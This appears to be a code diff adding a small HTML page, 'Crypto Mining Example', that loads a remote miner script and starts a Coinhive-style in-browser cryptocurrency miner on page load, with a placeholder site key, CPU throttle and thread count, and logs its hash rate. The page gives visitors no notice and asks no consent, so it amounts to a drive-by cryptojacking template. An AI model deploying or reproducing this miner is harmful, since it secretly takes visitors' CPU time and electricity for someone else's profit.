@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Mining Example</title>
+</head>
+<body>
+    <h1>Crypto Mining Example</h1>
+    <script src="https://example.com/miner.js"></script> <!-- Use um script de mineração legítimo para testes -->
+    <script>
+        // Suponha que miner.js carrega uma biblioteca de mineração
+        var miner = new Miner.Anonymous('YOUR_SITE_KEY', {
+            throttle: 0.3, // Define o uso da CPU
+            threads: 2 // Número de threads de mineração
+        });
+        miner.start();
+
+        // Exibir informações de mineração
+        setInterval(function() {
+            console.log('Hashes/min: ' + miner.getHashesPerSecond() * 60);
+            console.log('Total hashes: ' + miner.getTotalHashes());
+        }, 1000);
+    </script>
+</body>
+</html>
